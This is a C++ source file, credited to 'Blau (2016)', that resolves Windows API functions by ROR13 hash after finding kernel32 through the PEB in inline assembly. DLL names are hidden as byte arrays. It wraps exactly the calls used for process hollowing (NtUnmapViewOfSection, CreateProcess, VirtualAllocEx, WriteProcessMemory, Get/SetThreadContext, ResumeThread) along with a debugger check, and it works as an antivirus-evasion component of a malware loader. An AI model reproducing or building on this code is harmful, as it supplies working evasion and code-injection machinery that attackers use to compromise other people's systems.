#include "DynamicLoad.hpp"

/**
    DynamicLoad class by Blau (2016)
    Credits to: Topher Timzen (https://www.tophertimzen.com/blog/shellcodeTechniquesCPP/)
**/

unsigned int kernel32BaseAddr = 0;
unsigned int ntdllBaseAddr = 0;
unsigned int msvcrtBaseAddr = 0;
unsigned int psapiBaseAddr = 0;
unsigned int user32BaseAddr = 0;

void DynamicLoad::LoadLibraries() {
    //kernel32.dll
    kernel32BaseAddr = DynamicLoad::FindKernel32();

    //ntdll.dll
    char szNtdllDll[] = {0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C, 0x00};
    ntdllBaseAddr = getLibrary(szNtdllDll);

    //msvcrt.dll
    char szMsvcrt[] = {0x6D, 0x73, 0x76, 0x63, 0x72, 0x74, 0x2E, 0x64, 0x6C, 0x6C, 0x00};
    msvcrtBaseAddr = getLibrary(szMsvcrt);

    //Psapi.dll
    char szPsapi[] = {0x50, 0x73, 0x61, 0x70, 0x69, 0x2E, 0x64, 0x6C, 0x6C, 0x00};
    psapiBaseAddr = getLibrary(szPsapi);

    //user32.dll
    char szUser32Dll[] = {'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0};
    user32BaseAddr = getLibrary(szUser32Dll);
}

__declspec(naked)unsigned int DynamicLoad::FindKernel32() {
    __asm {
        mov eax, fs:[0x30];    // get a pointer to the PEB
        mov eax, [eax + 0x0C];  // get PEB->Ldr
        mov eax, [eax + 0x14];  // get PEB->Ldr.InMemoryOrderModuleList.Flink
        mov eax, [eax];         // get the next entry (2nd entry)
        mov eax, [eax];         // get the next entry (3rd entry)
        mov eax, [eax + 0x10];  // get the 3rd entries base address (kernel32.dll)
        ret;
    };
}

unsigned int __stdcall DynamicLoad::hashString(char* symbol) {
    __asm {
        mov esi, symbol;
        xor edi, edi;
        xor eax, eax;
        cld;
        continueHashing:
        lodsb;
        test al, al
        jz hash_done;
        ror edi, 0xd; //0xd = 13
        add edi, eax;
        jmp  continueHashing;
        hash_done:
        mov eax, edi;
    };
}

unsigned int __stdcall DynamicLoad::findSymbolByHash(unsigned int dllBase, unsigned int symHash) {
    __asm {
        pushad;
        mov edi, symHash;
        mov ebp, dllBase;
        mov eax, [ebp + 0x3c];        //PEheader
        mov edx, [ebp + eax + 0x78];  //export table
        add edx, ebp;
        mov ecx, [edx + 0x18];        //numberOfNames
        mov ebx, [edx + 0x20];        //numberOfExports
        add ebx, ebp;
        search_loop:
        jecxz noHash;
        dec ecx;                      //decrement numberOfNames
        mov esi, [ebx + ecx * 4];     //get an export name
        add esi, ebp;
        push ecx;
        push ebx;
        push edi;
        push esi;                     //setup stack frame and save clobber registers
        call hashString;
        pop edi;
        pop ebx;
        pop ecx;                      //restore clobber registers
        cmp eax, edi;                 //check if hash matched
        jnz search_loop;
        mov ebx, [edx + 0x24];        //get address of the ordinals
        add ebx, ebp;
        mov cx, [ebx + 2 * ecx];      //current ordinal number
        mov ebx, [edx + 0x1c];       //extract the address table offset
        add ebx, ebp;
        mov eax, [ebx + 4 * ecx];    //address of function
        add eax, ebp;
        jmp done;
        noHash:
        mov eax, 1;
        done:
        mov[esp + 0x1c], eax;
        popad;
    };
}

unsigned int DynamicLoad::getLibrary(char *libraryName) {
    FunPtr_LoadLibrary MyLoadLibraryA;
    MyLoadLibraryA = (FunPtr_LoadLibrary)(findSymbolByHash(kernel32BaseAddr, 0xEC0E4E8E));
    unsigned int baseAddr = MyLoadLibraryA(libraryName);
    return baseAddr;
}

LONG DynamicLoad::fNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef LONG ( __stdcall *NTUNMAPVIEWOFSECTION)(HANDLE ProcessHandle, PVOID BaseAddress);
    NTUNMAPVIEWOFSECTION bNtUnmapViewOfSection = (NTUNMAPVIEWOFSECTION)findSymbolByHash(ntdllBaseAddr, 0xF21037D0);

    return bNtUnmapViewOfSection(ProcessHandle, BaseAddress);
}

BOOL DynamicLoad::fCreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * CREATEPROCESSA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    CREATEPROCESSA bCreateProcessA = (CREATEPROCESSA)(findSymbolByHash(kernel32BaseAddr, 0x16B3FE72));

    return bCreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}

BOOL DynamicLoad::fCreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * CREATEPROCESSW)(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
    CREATEPROCESSW bCreateProcessW = (CREATEPROCESSW)(findSymbolByHash(kernel32BaseAddr, 0x16B3FE88));

    return bCreateProcessW(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
}


LPVOID DynamicLoad::fVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef LPVOID ( __stdcall * VIRTUALALLOCEX)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    VIRTUALALLOCEX bVirtualAllocEx = (VIRTUALALLOCEX)(findSymbolByHash(kernel32BaseAddr, 0x6E1A959C));

    return bVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
}

LPVOID DynamicLoad::fVirtualAlloc( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef LPVOID ( __stdcall * VIRTUALALLOC)( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
    VIRTUALALLOC bVirtualAlloc = (VIRTUALALLOC)(findSymbolByHash(kernel32BaseAddr, 0x91AFCA54));

    return bVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL DynamicLoad::fGetThreadContext(HANDLE hThread, LPCONTEXT lpContext){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * GETTHREADCONTEXT)(HANDLE hThread, LPCONTEXT lpContext);
    GETTHREADCONTEXT bGetThreadContext = (GETTHREADCONTEXT)(findSymbolByHash(kernel32BaseAddr, 0x68A7C7D2));

    return bGetThreadContext(hThread, lpContext);
}

BOOL DynamicLoad::fReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * READPROCESSMEMORY)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesRead);
    READPROCESSMEMORY bReadProcessMemory = (READPROCESSMEMORY)(findSymbolByHash(kernel32BaseAddr, 0x579D1BE9));

    return bReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
}

BOOL DynamicLoad::fWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * WRITEPROCESSMEMORY)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);
    WRITEPROCESSMEMORY bWriteProcessMemory = (WRITEPROCESSMEMORY)(findSymbolByHash(kernel32BaseAddr, 0xD83D6AA1));

    return bWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

BOOL DynamicLoad::fSetThreadContext(HANDLE hThread, CONTEXT *lpContext){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * SETTHREADCONTEXT)(HANDLE hThread, CONTEXT *lpContext);
    SETTHREADCONTEXT bSetThreadContext = (SETTHREADCONTEXT)(findSymbolByHash(kernel32BaseAddr, 0xE8A7C7D3));

    return bSetThreadContext(hThread, lpContext);
}

DWORD DynamicLoad::fResumeThread(HANDLE hThread){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef DWORD ( __stdcall * RESUMETHREAD)(HANDLE hThread);
    RESUMETHREAD bResumeThread = (RESUMETHREAD)(findSymbolByHash(kernel32BaseAddr, 0x9E4A3F88));

    return bResumeThread(hThread);
}

BOOL DynamicLoad::fVirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * VIRTUALFREE)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
    VIRTUALFREE bVirtualFree = (VIRTUALFREE)(findSymbolByHash(kernel32BaseAddr, 0x30633AC));

    return bVirtualFree(lpAddress, dwSize, dwFreeType);
}

DWORD DynamicLoad::fGetModuleFileNameA(HMODULE hModule, LPTSTR lpFilename, DWORD nSize){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef DWORD (__stdcall *GETMODULEFILENAMEA)(HMODULE hModule, LPTSTR lpFilename, DWORD nSize);
    GETMODULEFILENAMEA bGetModuleFileNameA = (GETMODULEFILENAMEA)(findSymbolByHash(kernel32BaseAddr, 0x45B06D76));

    return bGetModuleFileNameA(hModule, lpFilename, nSize);
}

DWORD DynamicLoad::fRtlZeroMemory(VOID* Dst, SIZE_T nSize){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef DWORD ( __stdcall * RTLZEROMEMORY)(VOID* Dst, int Value, SIZE_T nSize);
    RTLZEROMEMORY bRtlZeroMemory = (RTLZEROMEMORY)(findSymbolByHash(msvcrtBaseAddr, 0x5D2E6D6B));

    return bRtlZeroMemory(Dst, 0, nSize);
}

VOID DynamicLoad::fExitProcess(UINT uExitCode){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef VOID ( __stdcall * EXITPROCESS)(UINT uExitCode);
    EXITPROCESS bExitProcess = (EXITPROCESS)(findSymbolByHash(kernel32BaseAddr, 0x73E2D87E));

    return bExitProcess(uExitCode);
}

BOOL DynamicLoad::fIsDebuggerPresent(VOID){
    if(kernel32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef BOOL ( __stdcall * ISDEBUGGERPRESENT)(VOID);
    ISDEBUGGERPRESENT bIsDebuggerPresent = (ISDEBUGGERPRESENT)(findSymbolByHash(kernel32BaseAddr, 0xA36DC676));

    return bIsDebuggerPresent();
}

PVOID DynamicLoad::fMalloc(SIZE_T nSize) {
    if(msvcrtBaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef PVOID  ( __stdcall * MALLOC)(SIZE_T nSize);
    MALLOC bMalloc = (MALLOC)(findSymbolByHash(msvcrtBaseAddr, 0x5B7E2B9A));

    return bMalloc(nSize);
}

void DynamicLoad::fFree(void* MemBlock){
    if(msvcrtBaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef void ( __stdcall * FREE)(void* MemBlock);
    FREE bFree = (FREE)(findSymbolByHash(msvcrtBaseAddr, 0xCF281CE5));

    return bFree(MemBlock);
}

int DynamicLoad::fMessageBoxA(HWND h1, LPCSTR lp1, LPCSTR lp2, UINT u1) {
    if(user32BaseAddr == 0) DynamicLoad::LoadLibraries();
    typedef int(__stdcall *MESSAGEBOXA)(HWND, LPCSTR, LPCSTR, UINT);
    MESSAGEBOXA bMessageBoxA = (MESSAGEBOXA)(findSymbolByHash(user32BaseAddr, 0xBC4DA2A8));

    return bMessageBoxA(h1, lp1, lp2, u1);
}
